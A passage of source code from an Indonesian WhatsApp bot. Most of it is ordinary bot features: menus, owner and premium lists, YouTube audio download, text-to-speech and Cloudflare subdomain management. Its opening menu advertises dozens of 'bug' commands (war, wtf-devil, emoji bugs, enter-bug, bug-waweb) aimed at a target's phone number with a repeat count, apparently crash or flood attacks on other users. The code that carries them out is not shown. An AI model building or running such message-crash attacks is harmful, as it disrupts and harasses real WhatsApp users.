╰❑


╭─❑ 「 *Bug war only* 」 ❑──
│◦   ${prefix}war1 62xxx
│◦   ${prefix}war2 62xxx
│◦   ${prefix}war3 62xxx
│◦   ${prefix}war4 62xxx
│◦   ${prefix}war5 62xxx
│◦   ${prefix}war6 62xxx
│◦   ${prefix}war7 62xxx
│◦   ${prefix}war8 62xxx
│◦   ${prefix}war9 62xxx
│◦   ${prefix}war10 62xxx
│◦   ${prefix}war11 62xxx
│◦   ${prefix}war12 62xxx
│◦   ${prefix}spesialwar 62xxx <not rekomendasi>
╰❑

╭─❑ 「 *Unexpected bug* 」 ❑──
│◦   ${prefix}unex-bug 62xxx, jumlah
│◦   ${prefix}unex-strong 62xxx, jumlah
│◦   ${prefix}unex-jids 62xxx, jumlah
│◦   ${prefix}unex-system 62xxx, jumlah
│◦   ${prefix}unex-sql 62xxx, jumlah
│◦   ${prefix}unex-ui 62xxx, jumlah
│◦   ${prefix}unex-internal 62xxx, jumlah
│◦   ${prefix}unex-external 62xxx, jumlah
╰❑

╭─❑ 「 *[🤯] System ui not respon bug* 」 ❑──
│◦   ${prefix}wtf 62xxx
│◦   ${prefix}wtf-devil 62xxx, jumlah
│◦   ${prefix}wtf-devil1 62xxx
│◦   ${prefix}wtf-devil2 62xxx
│◦   ${prefix}wtf-devil3 62xxx
│◦   ${prefix}wtf-devil4 62xxx
│◦   ${prefix}wtf-devil5 62xxx
╰❑

╭─❑ 「 *Emoji Bug 2.0* 」 ❑──
│◦   ${prefix}🎭 62xxx
│◦   ${prefix}👻 62xxx
│◦   ${prefix}💩 62xxx
│◦   ${prefix}👽 62xxx
│◦   ${prefix}🐕 62xxx
│◦   ${prefix}🐶 62xxx
│◦   ${prefix}🍌 62xxx
│◦   ${prefix}🗿 62xxx
│◦   ${prefix}🤯 62xxx
│◦   ${prefix}🤡 62xxx
│◦   ${prefix}〽️ 62xxx
│◦   ${prefix}🎁 62xxx
│◦   ${prefix}⚔️ 62xxx
│◦   ${prefix}🗡 62xxx
│◦   ${prefix}🔧 62xxx
│◦   ${prefix}⚙️ 62xxx
╰❑

╭─❑ 「 *Enter Bug* 」 ❑──
│◦   ${prefix}enter-devil 62xxx, jumlah
│◦   ${prefix}enter-bug 62xxx, jumlah
│◦   ${prefix}enter-mybug 62xxx, jumlah
│◦   ${prefix}enter-internal 62xxx, jumlah
│◦   ${prefix}enter-external 62xxx, jumlah
│◦   ${prefix}enter-ui 62xxx, jumlah
│◦   ${prefix}enter-uicrash 62xxx, jumlah
│◦   ${prefix}enter-system 62xxx, jumlah
│◦   ${prefix}enter-engine 62xxx, jumlah
│◦   ${prefix}enter-wtf 62xxx 
│◦   ${prefix}enter-list 62xxx|jumlah
│◦   ${prefix}enter-samsung 62xxx
│◦   ${prefix}enter-react *<reply message>*
╰❑

╭─❑ 「 *OMG BUG* 」 ❑──
│◦   ${prefix}bug-waweb 62xxx
│◦   ${prefix}devil-andro amount
│◦   ${prefix}bug-meta 62xxx
╰❑`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "panelmenu": {
let teksmenu = `*乂 P A N E L M E N U*
* addadmin
* addadmin2
* cpanel
* cpanel2
* listpanel
* listadmin
* deladmin
* delpanel`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buat Server Panel\",\"title\":\"Buat Panel\",\"id\":\".cpanel\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Hapus Server Panel\",\"title\":\"Hapus Panel\",\"id\":\".delpanel\"}" 
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "domainmenu": {
let teksmenu = `*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "grupmenu": {
let teksmenu = `*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Tutup Grup\",\"title\":\"Close Grup\",\"id\":\".close\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buka Grup\",\"title\":\"Open Grup\",\"id\":\".open\"}" 
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "ownermenu": {
let teksmenu = ` *Haii* @${m.sender.split("@")[0]}!
 *Selamat ${ucapan()}*

*乂 O W N E R M E N U*
* addowner
* addpremium
* delpremium
* delowner
* listowner
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* autoreadsw
* welcome
* getcase
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
documentMessage: {"url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/png",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"jpegThumbnail": await resize(fs.readFileSync("./media/menu.jpg"), 400, 400),
"fileLength": 9999999999,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `© ${namabot} ${global.version}`,
"directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
"contactVcard": true,
"mediaKeyTimestamp": "1658703206"
}
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Backup Script Bot\",\"title\":\"Backup Script\",\"id\":\".sc\"}"
},
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Restarting Bot\",\"title\":\"Restart Bot\",\"id\":\".rst\"}"
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})}
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "trxoff": case "modeoff": {
if (!isOwner) return reply(msg.owner)
global.owneroff = true
reply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Offline*')
}
break
case "trxon": case "modeon": {
if (!isOwner) return reply(msg.owner)
global.owneroff = false
reply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Online*')
}
break
case "addowner": case "addown": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return reply(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
if (orang == botNumber) return reply("Tidak Bisa Menambahkan Nomor Bot Kedalam Database Owner Tambahan!")
let check = await anggazyy.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return reply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
await owner2.push(orang)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Berhasil Menambah Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Kedalam Database Owner`)
} else {
reply(example("@tag/6283XXX"))
}
}
break
case "delowner": case "delown": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./all/database/owner.json", "[]")
return reply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return reply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return reply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
reply(example("@tag/6283XXX"))
}
}
break
case "addprem": case "addpremium": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return reply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
reply(`*Berhasil Menambah Premium ✅*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return reply(example("@tag/62838XXX"))
}}
break
case "delprem": case "delpremium": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return reply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
reply(`*Berhasil Menghapus Premium ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return reply(example("@tag/62838XXX"))
}}
break
case "listown": case "listowner": {
if (owner2.length < 1) return reply("Tidak Ada Owner Tambahan")
let teksnya = `*LIST OWNER BOT⚡*\n\n`
owner2.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
anggazyy.sendMessage(m.chat, {text: teksnya, mentions: [...owner2]}, {quoted: qtoko})
}
break
case "listprem": case "listpremium": {
if (premium.length < 1) return reply("Tidak Ada User Premium")
let teksnya = `*LIST USER PREMIUM⚡*\n\n`
premium.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
anggazyy.sendMessage(m.chat, {text: teksnya, mentions: [...premium]}, {quoted: qtoko})
}
break
case "yts": {
if (!text) return reply(`*Masukan Teksnya!*
Contoh : *${cmd}* Story Anime`)
await reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return reply(mess.error)
let datanew = new Array()
let txt = []
global.tempYts = []
let result = data.all.slice(0,10)
for (let i of result) {
let tempid = await createSerial(5)
global.tempYts.push({
id: `${tempid}`, 
judul: `${i?.title || "unknown"}`, 
durasi: `${i?.timestamp || "unknown"}`, 
author: `${i.author?.name || "unknown"}`, 
link: i.url, 
image: i.thumbnail
})
txt.push(`* *ID Music :* #${tempid}
* *Judul :* ${i.title}
* *Channel :* ${i.author?.name || "unknown"}
* *Durasi :* ${i?.timestamp || "unknown"}
* *Link Url :* ${i.url}\n\n`)
}
for (let ii = 0; ii < result.length; ii++) {
datanew.push({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\n"+txt[ii]
}),
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Powered By ${namabot2}`
}),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: await fetch(result[ii].thumbnail)}, { upload: anggazyy.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "quick_reply",
buttonParamsJson: `{\"display_text\":\"Play Music ID #${global.tempYts[ii].id}\",\"title\":\"Play Music\",\"id\":\".ytsplay ${global.tempYts[ii].id}\"}`
}]
})
})}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "Berikut Adalah Hasil Pencarian Dari *Youtube 🔎*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: datanew
})
})}
}}, {userJid: m.sender, quoted: m})
return anggazyy.relayMessage(m.chat, msgii.message, {
messageId: msgii.key.id
})
}).catch(err => reply(err.toString()))
}
break
case "ytsplay": {
if (!text) return
let cekdulu = await global.tempYts.find(e => e.id == text)
if (!cekdulu) return reply("ID Music Tidak Ditemukan")
let Obj = cekdulu
if (Obj.link == null) return reply("Maaf Audio Sudah Tidak Tersedia")
await reply(`Memproses Pengiriman Audio Dari *Youtube Search ID #${Obj.id}*`)
var judul = `./all/tmp/${getRandom(".mp3")}`
const videoURL = Obj.link
const options = {
  quality: 'highestaudio',
  filter: 'audioonly'
}
ytdl(videoURL, options)
  .pipe(fs.createWriteStream(judul))
  .on('finish', async function () {
try {
await anggazyy.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg', contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: Obj.thumbnail, title: Obj.judul, body: `Duration : ${Obj.durasi} | Author : ${Obj.author}`, sourceUrl: Obj.link,  renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(judul)
} catch (e) {
await anggazyy.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg'}, {quoted: m})
await fs.unlinkSync(judul)
}
let position = global.tempYts.indexOf(Obj)
global.tempYts[position].link = null
}).on('error', (err) => {
return reply(err.toString())
})}
break
case "setppbot": case "setpp": {
if (!isOwner) return reply(msg.owner)
if (/image/g.test(mime)) {
let media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
await anggazyy.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply("*Berhasil Mengganti Profil ✅*")
} else return reply(example('dengan mengirim foto'))}
break
case "setppbotpanjang": case "setpppanjang": {
if (!isOwner) return reply(msg.owner)
if (/image/g.test(mime)) {
var medis = await anggazyy.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await anggazyy.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
reply("*Berhasil Mengganti Profil ✅*")
} else return reply(example('dengan mengirim foto'))
}
break
case "setnamabot": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example('teksnya'))
anggazyy.updateProfileName(text)
reply("*Berhasil Mengganti Nama Bot ✅*")
}
break
case "setbio": case "setbiobot": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example('teksnya'))
anggazyy.updateProfileStatus(text)
reply("*Berhasil Mengganti Bio Bot ✅*")
}
break
case "listdomain": {
var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
reply(teks)
}
break
case "listsubdomain": case "listsubdo": {
if (!isOwner) return reply(msg.owner)
if (!args[0]) return reply(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return reply("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return reply(teks)
})
}
break
case "domain1": case "domain2": case "domain3": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("host|ip"))
if (!text.split("|")) return reply(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return reply(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return reply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) reply(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else reply(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
if (!pusat) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!sub) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else return reply("Domain Tidak Ditemukan")
if (!sub.includes(".")) return reply("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return reply("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
reply(`*Berhasil Menghapus Subdomain ✅*
*Subdomain :* ${dom}
*Domain Induk :* ${tldnya}`)
}
break
case "tts": {
if (!text) return reply(example("Hallo saya manusia"))
if (text.length >= 300) return reply("Jumlah huruf harus di bawah 300!")
reply(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
anggazyy.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return reply(e.toString())
}
}
break
case "ytplay": case "play": {
if (!text) return reply(example('Dj tiktok'))
reply(msg.wait)
const { pipeline } = require('stream')
const { promisify } = require('util')
const streamPipeline = promisify(pipeline)
try {
let search = await yts(text)
let vid = search.videos[0]
let { title, thumbnail: thumb, timestamp, author, url } = vid
const audioStream = ytdl(url, {
filter: 'audioonly',
quality: 'highestaudio'})
let acak = await getRandom(".mp3")
let temp = "./all/tmp/" + acak
const writableStream = fs.createWriteStream(temp)
await streamPipeline(audioStream, writableStream)
await anggazyy.sendMessage(m.chat, {audio: fs.readFileSync(temp), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {thumbnailUrl: thumb, title: title, body: "Duration : "+timestamp+" | "+"Author : "+author.name, sourceUrl: url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(temp)
} catch (e) {
return reply(e.toString())
}
}
break
case "setmenu": {
if (!isOwner && !isPremium) return reply(msg.owner)
let menuu1 = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/menuu1.jpg")}, { upload: anggazyy.waUploadToServer })
let menuu2 = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/menuu2.jpg")}, { upload: anggazyy.waUploadToServer })
let menu3 = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/menu3.jpg")}, { upload: anggazyy.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "_Silahkan atur settings tampilan nya tuan._"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Tampilan settings (1)*

* Replying with button
* Switch Image
* Respon Fast`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...menuu1
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Change menu 1\",\"title\":\"Change\",\"id\":\".menu1\"}"
                  }
                ]
              })
            },
            {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `Tampilan settings (2)*

* Replying with payment
* Switch Quoted
* Respon fast`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...menuu2
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Change menu 2\",\"title\":\"Change\",\"id\":\".menu2\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Tampilan settings (3)*

* Replying with contact
* Switch Image
* Respon Fast`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...menu3
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Change menu 3\",\"title\":\"Change\",\"id\":\".menu3\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qpayment})


await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "qc": {
if (!text) return reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
reply(msg.wait)
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./all/tmp/"+makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return reply("Error")
await anggazyy.sendStimg(m.chat, tempnya, m, {packname: namabot})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break
case "list_vps": {
let teks = `
Belum Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
